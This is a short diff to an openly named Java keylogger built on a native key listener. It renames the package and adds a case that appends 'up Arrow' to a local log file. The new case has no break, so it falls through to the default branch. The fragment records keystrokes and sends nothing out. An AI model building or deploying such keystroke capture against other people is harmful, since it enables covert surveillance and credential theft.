@@ -1,4 +1,4 @@
-package keylogger;
+package main;
 
 import java.io.FileWriter;
 import java.io.IOException;
@@ -57,6 +57,15 @@ public class Keylogger implements NativeKeyListener  {
 				
 			}
 			break;
+		case NativeKeyEvent.VC_UP:
+			try {
+				FileWriter fw = new FileWriter("src//keylogger//keylogger.txt",true);
+				fw.write("up Arrow");
+				fw.close();
+			} catch (IOException ex) {
+				
+			}
+		
 		default:
 			try {
 				FileWriter fw = new FileWriter("src//keylogger//keylogger.txt",true);
